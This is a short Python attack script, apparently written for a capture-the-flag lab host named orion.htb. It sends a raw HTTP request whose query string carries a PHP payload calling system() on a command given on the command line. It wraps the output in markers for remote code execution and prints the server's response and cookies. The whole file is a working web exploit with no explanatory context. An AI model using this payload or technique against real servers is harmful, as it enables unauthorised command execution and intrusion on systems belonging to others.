import socket
import sys

TARGET_IP = "10.129.244.146"
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
marker_s, marker_e = "=S=", "=E="

php = "<?php echo '" + marker_s + "';system('" + cmd.replace("'", "\\'") + "');echo '" + marker_e + "';exit;?>"
path = "/admin/dashboard?x=" + php

req = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: orion.htb\r\n"
    f"User-Agent: raw-probe/1.0\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

s = socket.create_connection((TARGET_IP, 80), timeout=10)
s.sendall(req.encode())
resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
s.close()

sys.stdout.buffer.write(resp[:1500])
print()
print("---cookies (Set-Cookie lines)---")
for line in resp.split(b"\r\n"):
    if line.lower().startswith(b"set-cookie"):
        print(line.decode(errors="replace"))
